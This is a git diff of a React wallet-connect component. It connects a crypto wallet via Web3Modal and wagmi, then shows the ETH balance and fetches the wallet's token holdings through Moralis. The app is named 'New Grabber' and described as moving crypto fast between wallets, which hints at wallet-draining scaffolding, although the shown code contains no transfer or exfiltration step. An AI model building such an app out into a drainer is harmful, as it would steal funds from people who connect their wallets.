@@ -1,11 +1,13 @@
 import { useState, useEffect } from 'react';
 import { createWeb3Modal, useWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react'
-import web3 from 'web3'
+// import Web3 from 'web3'
 import { WagmiConfig, useAccount, useDisconnect } from 'wagmi'
-import { mainnet, arbitrum, polygon, bsc } from 'wagmi/chains'
+import { mainnet, arbitrum, polygon, bsc, polygonMumbai, base } from 'wagmi/chains'
+import { fetchBalance } from '@wagmi/core'
+import Moralis from 'moralis';
 // 1. Get projectId
-const projectId = '0e82a2042e9b6e7c12a66c93606876c2';
-
+const projectId = import.meta.env.VITE_PROJECT_ID;
+const moralisApi = import.meta.env.VITE_MORALIS_API;
 const metadata = {
     name: 'New Grabber',
     description: 'New Grabber for Moving Crypto Fast from one wallet to the other',
@@ -14,8 +16,7 @@ const metadata = {
 }
 
 // 2. Create wagmiConfig
-const chains = [mainnet, arbitrum, polygon, bsc];
-
+const chains = [mainnet, arbitrum, polygon, bsc, polygonMumbai, base];
 const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata })
 
 /**
@@ -30,62 +31,55 @@ export function Connect() {
         </WagmiConfig>
     )
 }
-/**
-+ * ConnectButton Component.
-+ *
-+ * This component renders a button that connects to a Web3 provider using useWeb3Modal hook. It also displays the user's address and balance if connected.
-+ *
-+ * @returns {JSX.Element} - The ConnectButton component.
-            + */
 function ConnectButton() {
     const { open } = useWeb3Modal();
     const { address, isConnected, isDisconnected } = useAccount();
     const { disconnect } = useDisconnect();
     const [balance, setBalance] = useState('');
+    const [tokens, setTokens] = useState({});
 
-    // Function to handle disconnection
     const handleDisconnect = () => {
         if (isConnected) {
-            disconnect(); // Call the disconnect method from useWeb3Modal
+            disconnect();
         }
     }
 
-    console.log(isConnected);
-
-    // Fetch and update the user's balance
     useEffect(() => {
-        const fetchBalance = async () => {
+        const fetchData = async () => {
             if (isConnected && address) {
-                const web3connect = new web3(createWeb3Modal({ wagmiConfig, projectId, chains }).provider); // Initialize Web3 with the provider
-                const weiBalance = await web3connect.eth.getBalance(address);
-                const ethBalance = web3connect.utils.fromWei(weiBalance, 'ether');
+                try {
+                    await Moralis.start({ apiKey: moralisApi });
+                    const response = await Moralis.EvmApi.token.getWalletTokenBalances({
+                        chain: Moralis.EvmUtils.EvmChain.ETHEREUM,
+                        address: address
+                    });
+                    setTokens(response.raw);
+                } catch (error) {
+                    console.error(error);
+                }
+                const ethBalance = await fetchBalance({ address: address });
                 setBalance(ethBalance);
-                console.log(web3connect)
-
             }
         };
 
-        fetchBalance();
+        fetchData();
+
     }, [isConnected, address]);
 
-    // Check if the WalletConnect session is already established
     useEffect(() => {
         if (isDisconnected) {
-            // When disconnected, initiate the connection
             open();
         }
     }, [isDisconnected, open]);
 
-    console.log(balance)
-
     return (
         <>
-            {isDisconnected && (<button onClick={() => open()}>Open Connect Modal</button>)}
+            {isDisconnected && (<button onClick={open}>Open Connect Modal</button>)}
 
             {isConnected && (
                 <>
                     <p>Address: {address}</p>
-                    <p>Balance: {balance} ETH</p>
+                    <p>Balance: {balance.formatted} {balance.symbol}</p>
                     <button onClick={handleDisconnect}>Disconnect</button>
                 </>
             )}
